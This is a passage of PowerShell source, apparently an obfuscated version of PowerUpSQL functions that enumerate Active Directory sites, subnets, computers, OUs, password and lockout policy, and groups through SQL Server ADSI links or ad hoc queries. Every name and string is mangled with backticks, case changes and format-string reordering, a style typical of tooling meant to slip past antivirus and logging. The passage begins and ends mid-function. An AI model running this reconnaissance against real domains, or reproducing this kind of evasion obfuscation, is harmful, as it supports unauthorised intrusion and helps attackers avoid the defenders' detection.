        [switch]${su`pPrEsSV`ERBose}
    )

    Begin
    {
        
        if(-not ${i`N`sTA`NCE})
        {
            ${in`StANcE} = ${E`NV:Com`PuT`ERnAME}
        }
    }

    Process
    {
        
        if(${Ta`R`GETD`oMaIn})
        {
            ${doMA`In} = ${t`ArGE`TdoMa`in}
        }else{
            ${DoM`Ain} = &("{1}{3}{0}{2}"-f'verInf','Get-SQLSe','o','r') -SuppressVerbose -Instance ${I`NSta`NcE} -Username ${U`seRnA`me} -Password ${P`Assw`oRD} | &("{1}{3}{2}{0}" -f'ject','Se','ect-Ob','l') ("{1}{2}{0}"-f 'ame','Do','mainN') -ExpandProperty ("{1}{2}{3}{0}"-f 'Name','Dom','ai','n')
        }
        ${dOmaINd`I`S`T`inG`UiSHedNAMe} = &("{4}{5}{1}{0}{3}{2}"-f'ma','SQLDo','t','inObjec','Ge','t-') -SuppressVerbose -Instance ${in`staN`CE} -Username ${uSErNa`me} -Password ${PasS`wO`RD} -LinkUsername ${liN`KUS`ERnAmE} -LinkPassword ${L`iNkpa`S`Sw`ORD} -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields ("{2}{1}{3}{4}{0}"-f'e','ist','d','in','guishednam') -UseAdHoc | &("{0}{2}{1}" -f'Select-','ject','Ob') ("{2}{3}{0}{1}" -f'nam','e','distinguishe','d') -ExpandProperty ("{5}{1}{3}{2}{4}{0}"-f'name','is','inguishe','t','d','d')
        
        
        if(${uSead`hoc}){
            &("{1}{0}{2}{3}" -f't-SQLDom','Ge','ainObje','ct') -Verbose -Instance ${iNsT`AN`Ce} -Username ${US`e`RNaMe} -Password ${P`ASswo`Rd} -LinkUsername ${lINk`US`ErNAMe} -LinkPassword ${LIN`KPAS`sW`ord} -LdapFilter (("{5}{2}{0}{3}{1}{4}" -f 'Cate','=subnet','ct','gory',')','(obje')) -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields ("{9}{0}{8}{10}{7}{13}{6}{2}{5}{12}{3}{1}{11}{4}" -f'istingu','enchan','ct,','ed,wh',',location','whencr','obje',',','ished','name,d','name','ged','eat','site') -UseAdHoc            
        }else{
            &("{0}{4}{1}{3}{2}"-f'G','LDomainO','t','bjec','et-SQ') -Verbose -Instance ${I`NS`TANCe} -Username ${UsE`RnA`ME} -Password ${Pa`SsWOrD} -LinkUsername ${l`InkUSERN`AME} -LinkPassword ${LinkpA`S`SWoRd} -LdapFilter (("{4}{7}{1}{3}{5}{0}{6}{2}" -f'bn','or','t)','y=','(obj','su','e','ectCateg')) -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields ("{12}{4}{8}{3}{1}{10}{14}{5}{2}{7}{6}{11}{9}{0}{13}" -f 'ocat','object,wh','ted,wh','name,site',',distinguish','crea','ha','enc','ed','l','e','nged,','name','ion','n')          
        }
    }

    End
    {
    }
}






Function  get-s`qLdOmA`iN`s`ITE
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdAtory = ${fAL`SE},
        hElpmEssAGe = {"{4}{3}{7}{1}{6}{12}{11}{10}{13}{2}{8}{9}{0}{5}"-f 'r','r','QL','e','SQL Serv','.',' ','r o',' S','erve','to authenti',' account ','domain','cate to S'})]
        [string]${UserNA`me},

        [Parameter(mAnDATory = ${F`AlSE},
        HeLPmESsAge = {"{3}{5}{18}{4}{13}{12}{11}{15}{14}{2}{6}{7}{17}{1}{9}{8}{10}{16}{0}"-f'r.',' to authe','ccount pass','S','Serve','Q','w','or','e to ','nticat','SQL Ser','a','or dom','r ','n a','i','ve','d','L '})]
        [string]${PA`SS`WoRD},

        [Parameter(manDatory = ${F`Al`sE},
        hElPMeSSage = {"{6}{11}{3}{10}{5}{9}{4}{8}{7}{2}{0}{1}"-f'rver ADSI',' link.',' Se','account u','P',' to authe','Doma','SQL',' through ','nticate to LDA','sed','in '})]
        [string]${lIn`Ku`sERnA`mE},

        [Parameter(ManDatOrY = ${F`A`lsE},
        HeLpmeSsagE = {"{3}{13}{7}{10}{12}{8}{6}{15}{4}{9}{14}{11}{1}{0}{5}{2}"-f ' S','h SQL','I link.','Dom','enticate','erver ADS','o aut','unt passw','ed t',' to ','ord u','hroug','s','ain acco','LDAP t','h'})]
        [string]${l`I`Nkp`AsSwOrD},

        [Parameter(maNdatory = ${faL`sE},
        HeLPMesSaGe = {"{2}{6}{0}{3}{5}{4}{1}"-f 'o','.','Win','w','ntials','s crede','d'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRe`De`NT`IAL} =  $0459M2::"EmP`TY",

        [Parameter(mANdAtOrY = ${FA`lSE},
                ValUEFRoMpIpEliNEbypROpeRtyNAmE = ${tr`UE},
        HElPmeSSaGE = {"{2}{0}{9}{5}{8}{7}{4}{6}{1}{3}" -f 'L','ion t','SQ','o.','c','ver in','t','ce to conne','stan',' Ser'})]
        [string]${iNSta`NCE},

        [Parameter(maNDAtORy = ${F`AL`Se},
        hELpmesSaGe = {"{23}{13}{19}{30}{9}{16}{29}{6}{10}{5}{27}{11}{28}{31}{3}{14}{18}{15}{33}{21}{7}{20}{2}{36}{12}{8}{25}{26}{34}{32}{22}{4}{1}{17}{0}{35}{24}"-f's, ','ll enable adhoc queri','DSI server lin','he l','i',' inste','r execut','n ','and use O','connec','ing the query','d',' ',' ad','ink optio','l','tion f','e','n (default) wi','ho','A',' a','Hoc option w','Use','nd use OpenRowSet.','pen','Query. ','a',' of a server link. ','o','c ',' T','d','l create','The A','a','k'})]
        [Switch]${uSEa`D`h`oC},

        [Parameter(maNDaTORy = ${FA`l`SE},
        vALuefROmPiPEliNEBypRoperTYnAmE = ${T`Rue},
        hElPMESsagE = {"{0}{3}{2}{1}" -f'Doma',' query.',' to','in'})]
        [string]${Ta`RGet`dOmAin},

        [Parameter(mAnDAtOry = ${F`AL`se},
        hELPmEssaGE = {"{1}{3}{0}{7}{6}{4}{8}{5}{2}" -f's ','Su','unction is wrapped.','ppres','rors.','ed when f','se er','verbo','  Us'})]
        [switch]${SUp`pResS`V`ERbO`SE}
    )

    Begin
    {
        
        if(-not ${iNS`T`AnCe})
        {
            ${insta`N`cE} = ${EnV`:`cOM`PuTeR`Name}
        }
    }

    Process
    {
        
        if(${Ta`RGE`TDOm`AIN})
        {
            ${D`OMAiN} = ${ta`RgeT`D`OMa`in}
        }else{
            ${DOmA`in} = &("{4}{0}{1}{2}{3}"-f'et-S','QLS','erve','rInfo','G') -SuppressVerbose -Instance ${inS`Tan`CE} -Username ${u`s`ERnaMe} -Password ${pA`sswORD} | &("{2}{1}{0}"-f 'ject','elect-Ob','S') ("{1}{2}{0}"-f 'mainName','D','o') -ExpandProperty ("{1}{2}{0}"-f 'nName','Dom','ai')
        }
        ${Doma`IN`DiS`T`ing`U`I`sHEdnAMe} = &("{4}{3}{2}{5}{0}{1}" -f 'j','ect','QL','et-S','G','DomainOb') -SuppressVerbose -Instance ${I`NStan`CE} -Username ${useR`NAmE} -Password ${PA`SSW`oRd} -LinkUsername ${lI`NKu`S`eR`Name} -LinkPassword ${li`Nk`p`Assword} -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields ("{2}{1}{4}{0}{3}" -f 'tingu','i','d','ishedname','s') -UseAdHoc | &("{1}{2}{0}" -f 'ject','Select-','Ob') ("{1}{0}{2}{3}"-f'st','di','ing','uishedname') -ExpandProperty ("{1}{0}{4}{2}{3}" -f'ishe','distingu','na','me','d')
        
        
        if(${US`EAd`HOC}){
            &("{1}{2}{3}{0}" -f'bject','G','et-SQLDoma','inO') -Verbose -Instance ${InSt`An`Ce} -Username ${usErn`A`Me} -Password ${PA`ssw`oRd} -LinkUsername ${Lin`K`U`Se`RName} -LinkPassword ${LINK`pASS`wORD} -LdapFilter ("{1}{4}{2}{0}{3}" -f'gory=site','(','ctCate',')','obje') -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields ("{4}{12}{6}{9}{7}{1}{10}{2}{0}{3}{11}{5}{8}" -f'wh','gu','me,','encrea','n','henchange','me','distin','d',',','ishedna','ted,w','a') -UseAdHoc            
        }else{
            &("{2}{5}{4}{3}{1}{0}"-f 't','ainObjec','Ge','m','-SQLDo','t') -Verbose -Instance ${i`NS`TA`NcE} -Username ${usERn`AmE} -Password ${Pa`SSW`OrD} -LinkUsername ${LINk`U`sERnamE} -LinkPassword ${LI`N`kpaSs`WorD} -LdapFilter (("{6}{2}{5}{0}{3}{1}{4}"-f'ctCateg','ry=','obj','o','site)','e','(')) -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields ("{2}{7}{4}{6}{8}{0}{3}{1}{9}{5}" -f'name,whenc','at','name,','re','tinguis','ed','h','dis','ed','ed,whenchang')          
        }
    }

    End
    {
    }
}






Function  G`eT-sQl`domaIN`CO`mPUter
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandatORy = ${FA`L`Se},
        hELpmESsaGE = {"{11}{3}{1}{0}{15}{10}{13}{4}{9}{8}{7}{17}{14}{2}{16}{5}{12}{6}" -f 'main a','ver or do','e t','QL Ser','t t','L Se','.','ut','a','o ','ou','S','rver','n','nticat','cc','o SQ','he'})]
        [string]${us`ErN`AmE},

        [Parameter(MaNdaTORY = ${fAL`sE},
        HeLPMESSAge = {"{4}{0}{9}{6}{19}{5}{11}{14}{15}{1}{13}{3}{18}{16}{7}{2}{8}{17}{12}{10}"-f ' Se','pa','te to','word t','SQL',' do','ver ','ca',' SQL','r','.','ma','er','ss','in accou','nt ','enti',' Serv','o auth','or'})]
        [string]${pas`S`w`ord},

        [Parameter(mAnDATOrY = ${FA`Lse},
        HElPMESsAGE = {"{11}{4}{2}{10}{8}{6}{17}{0}{14}{5}{1}{16}{13}{15}{9}{3}{18}{7}{12}" -f 'i','e to','ccount ','gh ','main a','t','a','L S','d to ','hrou','use','Do','erver ADSI link.','L','ca','DAP t',' ','uthent','SQ'})]
        [string]${L`IN`kuseRN`A`Me},

        [Parameter(MandAToRY = ${faL`se},
        HElPmessagE = {"{2}{9}{7}{1}{13}{18}{16}{6}{4}{3}{8}{10}{15}{5}{12}{0}{11}{14}{17}" -f 'roug','u','D',' ','used','cate t',' ','co','to au','omain ac','t','h SQ','o LDAP th','n','L Ser','henti','assword','ver ADSI link.','t p'})]
        [string]${link`P`AS`SWord},

        [Parameter(manDatoRy = ${fal`se},
        hElPmEssAGe = {"{2}{3}{1}{0}" -f 's.','ential','Wind','ows cred'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cr`EDen`TiAl} =   (  GeT-cHILdITEm  vaRiabLE:0459m2 ).VAluE::"eM`pTY",

        [Parameter(MANdatoRY = ${FA`LSe},
                vAlUEfrOMpIPeLINEBypRopeRtyNamE = ${tr`Ue},
        HELPmESsage = {"{6}{2}{0}{1}{3}{5}{4}" -f 'Ser','ver instan','L ','ce to','ion to.',' connect','SQ'})]
        [string]${I`N`StanCE},

        [Parameter(maNdaToRY = ${F`AlSE},
                vAlUefRoMPiPelINebyproPERtynaMe = ${t`Rue},
        HELPmeSsAGE = {"{6}{4}{1}{8}{5}{0}{7}{2}{3}" -f'r to fi',' com','er f','or.','omain','te','D','lt','pu'})]
        [string]${FI`L`Terco`mpuTEr},

        [Parameter(mAndaTOry = ${f`A`LSe},
        helpmeSSaGE = {("{41}{13}{42}{45}{27}{10}{23}{40}{25}{8}{36}{14}{4}{3}{17}{43}{39}{31}{24}{9}{5}{18}{7}{29}{22}{11}{38}{1}{37}{35}{6}{30}{20}{12}{16}{19}{2}{47}{33}{21}{0}{15}{26}{32}{46}{28}{34}{44}" -f ' ','ult) ','p','te','ry ins','ink.  T','ea',' ','h','er l','ti','tion','r','oc c','ue','w','ver link and us','ad','he','e O',' ADSI se','tion','ink op','on','v',' executing t','ill enable adhoc qu','ec','d ','l','te an','a ser','eries,','y. The AdHoc op','use OpenRowSe','ll cr','e q','wi',' (defa',' ',' for','Use adh','o',' of','t.','nn',' an','enQuer')})]
        [Switch]${U`Se`AdHoC},

        [Parameter(ManDatORY = ${fa`LSE},
        vaLUEfrompIpeLiNeBYpROpeRtYnAME = ${tR`Ue},
        hELpmEsSaGE = {"{2}{0}{1}{4}{3}"-f 'a','in','Dom','ery.',' to qu'})]
        [string]${TA`R`g`ETdo`mAIn},

        [Parameter(MandaTORY = ${f`A`lse},
        heLpmeSSagE = {"{10}{6}{4}{5}{9}{3}{2}{0}{1}{7}{8}"-f 'ion',' ','ct','n','rors.','  Us','bose er','is wrapp','ed.','ed when fu','Suppress ver'})]
        [switch]${supP`ResSv`ErB`OSE}
    )

    Begin
    {
        
        if(-not ${INsT`An`ce})
        {
            ${In`STA`NCe} = ${Env`:co`mPuTer`NamE}
        }

        
        if((-not ${F`ilTERCOMPU`Ter})){
            ${FI`LT`e`RCOmpuTER} = '*'
        }
    }

    Process
    {
        
        if(${UsEaD`hOc}){
            &("{0}{2}{1}{3}{4}"-f 'Ge','-SQLDom','t','ainO','bject') -Verbose -Instance ${i`N`sT`AncE} -Username ${us`eR`NAmE} -Password ${PASSw`O`RD} -LinkUsername ${LINK`UsE`RNAME} -LinkPassword ${L`in`KP`ASSwoRd} -LdapPath ${ta`Rge`TdOm`A`In} -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields ("{2}{6}{0}{1}{18}{5}{13}{4}{20}{19}{17}{16}{12}{10}{9}{8}{7}{14}{21}{11}{3}{22}{15}" -f 'name,dnsh','o','sam','d,','ngs','ame','account','k,whencreate','temServicePac','ngSys','erati','enchange','rsion,op',',operati','d,w','spath','stemve','peratingsy','stn','stem,o','y','h','ad') -UseAdHoc            
        }else{
            &("{2}{3}{1}{5}{4}{0}" -f 't','Doma','Get-','SQL','ec','inObj') -Verbose -Instance ${INST`AN`Ce} -Username ${u`Sern`A`Me} -Password ${pAsS`WO`RD} -LinkUsername ${l`Ink`Usern`AME} -LinkPassword ${LiNkPAs`S`wO`RD} -LdapPath ${TA`RGE`TdOmaIN} -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields ("{4}{21}{15}{19}{20}{14}{3}{2}{9}{1}{12}{18}{11}{0}{8}{13}{16}{22}{5}{17}{7}{23}{10}{24}{6}" -f'tingSystemServicePack,wh','oper','ra','pe','s','n','dspath','ha','encr','tingsystem,','ged','rsion,opera','atingsyste','eat','e,o','ntnam','e','c','mve','e,dnsho','stnam','amaccou','d,whe','n',',a')            
        }
    }

    End
    {
    }
}





Function  Ge`T-S`QldO`MAInoU
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAndATOrY = ${fA`lsE},
        helpMessage = {"{7}{8}{10}{1}{6}{9}{4}{0}{2}{3}{5}" -f 'uthenticate to','in ',' SQL S','erver','to a','.','acco','S','QL Server or do','unt ','ma'})]
        [string]${U`s`Ername},

        [Parameter(MAnDATory = ${fAL`se},
        HeLpmESsAge = {"{17}{3}{10}{4}{0}{16}{18}{2}{12}{6}{7}{9}{15}{11}{13}{14}{5}{1}{8}"-f'r','rv',' accoun','L','r o','e','assword to ','au','er.','thenticat',' Serve',' to ','t p','SQL ','S','e',' doma','SQ','in'})]
        [string]${pa`SSw`ORd},

        [Parameter(MAnDAtOry = ${FaL`sE},
        heLpmESSAgE = {"{3}{8}{9}{4}{0}{5}{2}{19}{11}{13}{1}{7}{18}{17}{10}{20}{6}{15}{14}{16}{12}"-f 'unt used to ','ate ','h','D','o','aut','r','to L','omain ','acc','h SQL Serv','ti','.','c','DSI ',' A','link','throug','DAP ','en','e'})]
        [string]${l`In`KusernA`me},

        [Parameter(MAndaToRy = ${F`Alse},
        HELPmeSsAGe = {"{9}{8}{1}{6}{11}{2}{12}{0}{7}{4}{10}{3}{5}{13}" -f'to L',' account pa','uthent','er A','rough SQL','D','ssword used ','DAP th','omain','D',' Serv','to a','icate ','SI link.'})]
        [string]${Link`Pa`sSworD},

        [Parameter(mAnDAtOrY = ${Fa`l`Se},
        HElPmeSsage = {"{0}{3}{2}{5}{4}{1}"-f'W','ntials.','n','i','s crede','dow'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CrEdE`N`TiaL} =  (  Gi  vARIablE:0459m2 ).vAlUE::"E`MpTY",

        [Parameter(MaNdATory = ${Fa`LsE},
                VaLUEFRoMpIPELineBYpROpertynAME = ${t`Rue},
        hElpmESSAgE = {"{0}{4}{3}{5}{1}{6}{2}"-f'SQ','ce to','n to.',' ins','L Server','tan',' connectio'})]
        [string]${instA`N`ce},

        [Parameter(MANdaTORy = ${fa`lsE},
        HELPmeSsaGE = {"{44}{33}{46}{17}{3}{25}{16}{55}{27}{28}{36}{7}{2}{21}{37}{22}{6}{20}{4}{47}{51}{49}{56}{45}{30}{10}{38}{43}{57}{29}{8}{18}{1}{19}{11}{15}{52}{41}{39}{48}{12}{50}{35}{23}{24}{54}{0}{13}{53}{42}{5}{26}{9}{34}{40}{32}{14}{31}" -f 'l ena',' ','T','ing the ','(','o','k op',' ','li',' queries,','re','s','Ho','b','w','e ','uery i','t','nk','and u','tion ','h','in','pt','ion wi','q','c','stead',' o','r ','c','Set.','OpenRo','n fo',' an',' o','f a server link. ','e l','a','u','d use ','Q',' adh','te a','Use adhoc connectio',' will ','r execu','def','ery. The Ad','u','c','a','Open','le','l','n','lt)','n ADSI serve'})]
        [Switch]${U`SeaDHOC},

        [Parameter(mANdatOry = ${F`AlSe},
        VALueFroMpIpeLinebYprOPerTYName = ${tr`UE},
        hElpmesSaGe = {"{3}{0}{2}{1}" -f'in to','query.',' ','Doma'})]
        [string]${tARGe`Td`omAIN},

        [Parameter(manDatorY = ${fA`Lse},
        HeLpmessage = {"{5}{9}{6}{8}{12}{13}{10}{7}{2}{0}{4}{11}{3}{1}" -f 'uncti','d.','en f','rappe','on is','Supp','rbo','d wh','se er','ress ve','rs.  Use',' w','r','o'})]
        [switch]${sup`pREssv`E`RBoSE}
    )

    Begin
    {
        
        if(-not ${iNST`A`N`Ce})
        {
            ${i`Nst`Ance} = ${EN`V:cO`mPUteR`Name}
        }
    }

    Process
    {
        
        if(${u`s`E`AdhoC}){
            &("{4}{3}{2}{0}{5}{1}" -f'n','bject','i','LDoma','Get-SQ','O') -Verbose -Instance ${IN`sta`NCE} -Username ${USe`RN`Ame} -Password ${pA`S`SwoRd} -LinkUsername ${LINKus`eR`NA`me} -LinkPassword ${lin`k`p`ASsWoRd} -LdapPath ${t`A`RGEtD`OMaIn} -LdapFilter ("{8}{5}{7}{6}{2}{0}{3}{1}{4}{9}"-f 'organ','nal','gory=','izatio','Un','ctCa','e','t','(obje','it)') -LdapFields ("{9}{7}{16}{19}{17}{4}{11}{8}{12}{2}{18}{6}{3}{5}{13}{1}{15}{14}{0}{10}" -f 'n',',w','nstan','pe,whe','shedname','ncreat','ty','am','spath','n','ged',',ad',',i','ed','a','hench','e,distin','ui','ce','g') -UseAdHoc            
        }else{
            &("{4}{3}{1}{2}{0}" -f't','ai','nObjec','m','Get-SQLDo') -Verbose -Instance ${i`NS`TA`NCe} -Username ${usEr`N`AmE} -Password ${pAs`s`WoRd} -LinkUsername ${Li`Nk`Us`erNAme} -LinkPassword ${LIn`kpaS`sW`ord} -LdapPath ${t`A`RGEtdoM`Ain} -LdapFilter (("{4}{1}{0}{6}{5}{3}{2}" -f 'ni','ategory=orga','t)','nalUni','(objectC','atio','z')) -LdapFields ("{7}{13}{3}{1}{11}{0}{8}{12}{5}{2}{10}{4}{9}{6}" -f 'path,i','ad','d','guishedname,','an','te','ed','name,dis','nstancetype,whencre','g',',whench','s','a','tin')
        }
    }

    End
    {                                           
    }
}







Function  ge`T-sQLD`OmA`InaCCOun`T`pO`LICY
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANdAtORY = ${Fa`LSE},
        HELpMESsaGE = {"{2}{7}{6}{3}{8}{5}{10}{1}{9}{4}{0}" -f'ver.','o authe','SQL S','r do','icate to SQL Ser','n a','r o','erve','mai','nt','ccount t'})]
        [string]${Us`eRNAme},

        [Parameter(MAndaTorY = ${F`A`LSE},
        helPmEssaGE = {"{11}{7}{12}{18}{3}{20}{19}{15}{14}{0}{10}{5}{8}{6}{4}{2}{17}{1}{9}{16}{13}" -f 'r','to ','icat','omain a','uthent','t','a','QL','o ','SQL Serv','d ','S',' Server','r.',' passwo','t','e','e ',' or d','un','cco'})]
        [string]${Pa`s`swOrD},

        [Parameter(mandAToRy = ${F`A`lSe},
        HElPMeSSAge = {"{18}{2}{17}{9}{6}{20}{3}{1}{0}{12}{19}{5}{15}{10}{8}{16}{7}{13}{11}{4}{14}"-f 'aut',' used to ','oma','nt','lin','ica','o','Server',' ','cc','e','I ','h',' ADS','k.','t','to LDAP through SQL ','in a','D','ent','u'})]
        [string]${lIn`KUSER`NamE},

        [Parameter(ManDaToRy = ${f`ALse},
        HeLPMESSAGE = {"{5}{0}{14}{11}{13}{4}{2}{10}{9}{1}{8}{3}{16}{15}{7}{6}{12}"-f 'omain a','cate to LDAP ','rd ','ugh ','wo','D',' link','I','thro','authenti','used to ','as','.','s','ccount p','ADS','SQL Server '})]
        [string]${liNkP`A`S`SwOrD},

        [Parameter(MANDatorY = ${faL`se},
        hElpmeSSage = {"{0}{2}{1}{3}" -f 'Window','edenti','s cr','als.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cREde`NtI`Al} =   ( VarIAbLE  ('0'+'459m2')  -vALUeonl)::"em`Pty",

        [Parameter(maNDaToRY = ${FA`lSE},
                vAlUEFrOMpIPelIneBypROPERTYnAme = ${tr`UE},
        HelpMEsSAge = {"{0}{1}{2}{3}{6}{5}{4}"-f'SQ','L Serv','er instance to ','con','to.',' ','nection'})]
        [string]${I`NsTa`Nce},

        [Parameter(MAndaTORY = ${Fal`sE},
        HElPmESsAge = {("{58}{41}{12}{45}{0}{19}{5}{7}{54}{25}{53}{20}{42}{6}{22}{30}{49}{59}{14}{1}{26}{9}{18}{21}{43}{17}{29}{8}{44}{60}{16}{36}{32}{4}{50}{3}{61}{10}{46}{39}{2}{35}{37}{15}{57}{52}{27}{33}{51}{55}{34}{38}{13}{40}{56}{48}{23}{24}{47}{28}{31}{11}"-f'onnect','he ','nd ','ver li','s',' ','y in','for',' wi','pt','k','t.',' ','il','k.  T',' Op','e','t','io','ion','ng t','n','stead ',' adhoc qu','eries, and use Open','ec','link o','y','o',')','of','wSe','ADSI ','. ','Hoc ','us','ate an ','e','option w','a','l ','c','he quer',' (defaul','l','c',' ','R','ble',' a serv','er','The','uer','uti',' ex',' Ad','ena','enQ','Use adho','er lin','l cr','n')})]
        [Switch]${Us`Eadh`Oc},

        [Parameter(MandaTory = ${f`AlSe},
        vAlUEfrOmpipELiNEbypRoPERtYnAme = ${Tr`Ue},
        heLPMEssagE = {"{3}{2}{1}{0}{4}" -f'to q','main ','o','D','uery.'})]
        [string]${T`Argetdo`m`A`in},


        [Parameter(manDatOrY = ${f`ALsE},
        HelpMEsSaGE = {"{2}{3}{6}{9}{4}{8}{5}{10}{11}{0}{1}{7}" -f' wra','pp','Sup','press v',' Used whe','i','erbose err','ed.','n funct','ors. ','on',' is'})]
        [switch]${SUPprE`SS`V`erbo`Se}
    )

    Begin
    {
        
        if(-not ${INs`Ta`Nce})
        {
            ${Ins`Tan`cE} = ${enV:cOM`PU`T`e`RN`AMe}
        }

        
        ${tAB`LE`ACCoUn`TpO`LIcY} = &("{2}{1}{0}"-f 'ect','j','New-Ob') ("{4}{1}{0}{2}{3}" -f'a.DataT','Dat','a','ble','System.') 
        ${TabLeac`cOun`TPo`Licy}."coL`U`MnS".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}"-f'th','pwdhi','storyleng')) | &("{1}{0}{2}"-f'N','Out-','ull')
        ${tAblEAC`c`oU`Nt`po`LIcy}."COl`Umns".("{0}{1}" -f'A','dd').Invoke(("{0}{3}{4}{2}{1}"-f'loc','reshold','th','ko','ut')) | &("{1}{0}"-f'-Null','Out')
        ${tABleACcOu`N`T`POLIcY}."col`UmNS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{4}{2}{3}" -f'locko','utd','tio','n','ura')) | &("{2}{0}{1}"-f 'u','t-Null','O')
        ${T`Ab`lE`ACco`UNtPOLi`Cy}."Co`LuMNS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{5}{4}{3}{6}{1}{2}"-f 'lo','nwin','dow','servat','ob','ckout','io')) | &("{2}{1}{0}"-f'ull','N','Out-')
        ${t`A`BlEac`cOUnTPoL`iCY}."co`L`UMns".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}" -f 'gth','mi','npwdlen')) | &("{0}{1}"-f'Out-Nu','ll') 
        ${Ta`BL`E`AccO`UNT`po`lIcY}."c`OLU`mNS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}" -f 'inpw','m','dage')) | &("{0}{1}"-f 'O','ut-Null')
        ${taBL`ea`cCOuNt`PoLIcy}."cOlu`MnS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{4}{3}{2}{1}" -f'pw','perties','o','pr','d')) | &("{1}{2}{0}"-f'l','Out-Nu','l')
        ${ta`BLEa`CcoUntp`ol`i`cY}."cOL`Um`Ns".("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}" -f 'when','nged','cha')) | &("{1}{0}"-f 'ull','Out-N')
        ${TAblEa`cC`ou`N`Tpo`lIcy}."COlU`MNS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}" -f'g','link','p')) | &("{1}{2}{0}"-f 'l','Out-','Nul')
    }

    Process
    {
        
        if(${USE`Ad`Hoc}){
            ${rESu`lTs} = &("{5}{0}{2}{4}{3}{1}" -f '-SQLD','ect','oma','j','inOb','Get') -Verbose -Instance ${iNSt`A`NCE} -Username ${Us`ErnA`ME} -Password ${PA`sS`wOrD} -LinkUsername ${li`NK`UsErN`A`mE} -LinkPassword ${lin`k`Pass`WO`RD} -LdapPath ${taRgE`Td`OMAIN} -LdapFilter ("{3}{5}{1}{4}{0}{2}{6}" -f 'i','s=dom','n','(obje','a','ctClas','DNS)') -LdapFields ("{18}{2}{28}{14}{19}{35}{22}{7}{12}{4}{20}{0}{23}{9}{5}{24}{17}{29}{13}{6}{11}{26}{15}{1}{21}{25}{10}{30}{36}{32}{33}{3}{27}{31}{16}{8}{34}"-f 'shold,lo','nwin','sto','pwdprope','tth','utd','i','ock','a','o','e','o','ou','t','ylen','ervatio','ch','r','pwdhi','gt','re','dow,minp','l','ck','u','wdl','n,lockoutobs','rties,','r','a','ng','when',',','minpwdage,','nged,gplink','h,','th') -UseAdHoc            
        }else{
            ${r`E`SuLtS} = &("{4}{1}{3}{0}{2}" -f 'mainObj','L','ect','Do','Get-SQ') -Verbose -Instance ${I`NSTaNCE} -Username ${UsE`R`NAME} -Password ${p`ASs`Wo`RD} -LinkUsername ${LiNKUs`Ern`Ame} -LinkPassword ${LI`N`kPAs`SW`orD} -LdapPath ${T`Ar`GeT`dOmaIn} -LdapFilter ("{1}{2}{0}{3}"-f 'domainDNS','(objectCla','ss=',')') -LdapFields ("{21}{23}{9}{26}{7}{15}{19}{5}{3}{16}{6}{18}{27}{22}{25}{14}{20}{0}{8}{12}{1}{4}{10}{2}{28}{13}{24}{29}{11}{17}" -f ',m','e','pwdprop','th','n','kout','eshold,loc','h,l','i','yleng','gth,minpwdage,','lin','npwdl','ties,whe','vation','o','r','k','kou','c','window','pwdhis','ckou','tor','nc','tobser','t','tduration,lo','er','hanged,gp')
        }

        ${r`eSU`Lts} | &("{4}{1}{0}{2}{3}" -f'-Obje','rEach','c','t','Fo') {

            
            ${taBLE`ACCOuntp`o`lICY}."RO`wS".("{0}{1}" -f 'Ad','d').Invoke(
            ${_}."PWdh`iStOry`LE`N`GtH",
            ${_}."lo`C`K`OUTThr`eSHolD",
            [string]([string]${_}."Lo`CkoUTdu`RATIon" -replace '-','') / (60 * 10000000),
            [string]([string]${_}."l`OckOUTO`BsE`R`VatIoNW`iNDOw" -replace '-','') / (60 * 10000000),
            ${_}."m`iNP`wDlEn`gth",
            [string]  $gmuYp::"fl`Oor"([decimal](((([string]${_}."M`IN`Pwd`AgE" -replace '-','') / (60 * 10000000)/60))/24)),
            [string]${_}."P`wDPR`oPeRTiEs",
            [string]${_}."wh`ENC`HangED",
            [string]${_}."gpli`Nk" 
            ) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')

        }

        ${taBLEA`CCou`N`Tp`O`L`ICY}
    }

    End
    {                     
    }
}






Function  gE`T-s`Q`lDOMaiNgrOup
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MandatoRY = ${Fa`l`Se},
        HeLPmeSSagE = {"{14}{10}{4}{8}{9}{6}{0}{5}{12}{7}{3}{2}{11}{1}{16}{15}{13}" -f'mai','icate to','uth','a','rv','n','do','to ','e','r or ',' Se','ent',' account ','.','SQL','er',' SQL Serv'})]
        [string]${Us`ERN`AmE},

        [Parameter(MaNdATorY = ${FA`LSE},
        hElpmeSSagE = {"{8}{9}{15}{12}{5}{10}{17}{11}{1}{0}{14}{16}{3}{4}{13}{6}{7}{2}" -f'word to','t pass','er.','th','ent','i','t','o SQL Serv','SQ','L','n ','coun','ver or doma','icate ',' a',' Ser','u','ac'})]
        [string]${pA`sS`W`oRd},

        [Parameter(MandatORY = ${fa`lSe},
        HelPmEsSagE = {"{4}{8}{7}{3}{12}{11}{9}{2}{0}{1}{10}{13}{6}{5}" -f'te to LDAP through ','SQ','ca','nt us','Do','k.','I lin','n accou','mai','thenti','L Se','to au','ed ','rver ADS'})]
        [string]${L`InKUs`ERnAMe},

        [Parameter(MAndatoRy = ${F`AlSE},
